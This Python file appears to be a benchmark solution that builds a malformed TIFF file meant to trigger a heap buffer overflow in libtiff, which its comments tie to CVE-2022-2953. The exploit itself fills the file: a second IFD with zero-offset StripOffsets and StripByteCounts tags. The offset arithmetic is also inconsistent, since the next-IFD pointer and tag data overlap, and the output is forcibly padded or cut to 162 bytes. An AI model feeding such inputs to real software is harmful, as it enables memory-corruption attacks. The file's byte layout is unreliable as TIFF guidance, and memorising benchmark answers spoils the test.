import os
import struct
from typing import List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a TIFF file that triggers heap buffer overflow via invalid offline tags
        # with offset of zero. This exploits CVE-2022-2953 in libtiff.
        
        # Build a minimal valid TIFF structure first
        tiff_data = bytearray()
        
        # TIFF header (little-endian)
        tiff_data.extend(b'II')  # Little-endian
        tiff_data.extend(struct.pack('<H', 42))  # TIFF version
        tiff_data.extend(struct.pack('<I', 8))   # Offset to first IFD
        
        # First IFD (Image File Directory)
        ifd_offset = len(tiff_data)
        
        # Number of directory entries (tags)
        # We'll create tags including the vulnerable one
        num_entries = 5
        tiff_data.extend(struct.pack('<H', num_entries))
        
        # Tag 1: ImageWidth (required)
        # Tag code 256, type 3 (SHORT), count 1, value 1
        tiff_data.extend(struct.pack('<HHII', 256, 3, 1, 1))
        
        # Tag 2: ImageLength (required)
        # Tag code 257, type 3 (SHORT), count 1, value 1
        tiff_data.extend(struct.pack('<HHII', 257, 3, 1, 1))
        
        # Tag 3: BitsPerSample (required)
        # Tag code 258, type 3 (SHORT), count 1, value stored in offset
        tiff_data.extend(struct.pack('<HHII', 258, 3, 1, ifd_offset + 12 * num_entries + 4))
        
        # Tag 4: Compression (required) - value 1 = no compression
        # Tag code 259, type 3 (SHORT), count 1, value 1
        tiff_data.extend(struct.pack('<HHII', 259, 3, 1, 1))
        
        # Tag 5: PhotometricInterpretation (required) - value 1 = black-is-zero
        # Tag code 262, type 3 (SHORT), count 1, value 1
        tiff_data.extend(struct.pack('<HHII', 262, 3, 1, 1))
        
        # Offset to next IFD (0 = end)
        tiff_data.extend(struct.pack('<I', 0))
        
        # Data for BitsPerSample
        tiff_data.extend(struct.pack('<H', 8))  # 8 bits per sample
        
        # Now add the vulnerable offline tag in a second IFD
        # The vulnerability is triggered by an invalid offline tag with offset 0
        second_ifd_offset = len(tiff_data)
        
        # Update first IFD to point to second IFD
        tiff_data[ifd_offset + 12 * num_entries + 4:ifd_offset + 12 * num_entries + 8] = \
            struct.pack('<I', second_ifd_offset)
        
        # Create second IFD with vulnerable tag
        # Number of directory entries - include vulnerable tag
        num_entries2 = 2
        tiff_data.extend(struct.pack('<H', num_entries2))
        
        # Tag 1: StripOffsets (273) - this will be the vulnerable offline tag
        # Type 4 (LONG), count 1, but offset set to 0 (invalid)
        tiff_data.extend(struct.pack('<HHII', 273, 4, 1, 0))  # Vulnerable: offset = 0
        
        # Tag 2: StripByteCounts (279) - also with offset 0
        tiff_data.extend(struct.pack('<HHII', 279, 4, 1, 0))  # Also invalid
        
        # Offset to next IFD (0 = end)
        tiff_data.extend(struct.pack('<I', 0))
        
        # Add some padding to reach the target length of 162 bytes
        # The ground-truth PoC is 162 bytes
        target_length = 162
        if len(tiff_data) < target_length:
            tiff_data.extend(b'\x00' * (target_length - len(tiff_data)))
        elif len(tiff_data) > target_length:
            tiff_data = tiff_data[:target_length]
        
        return bytes(tiff_data)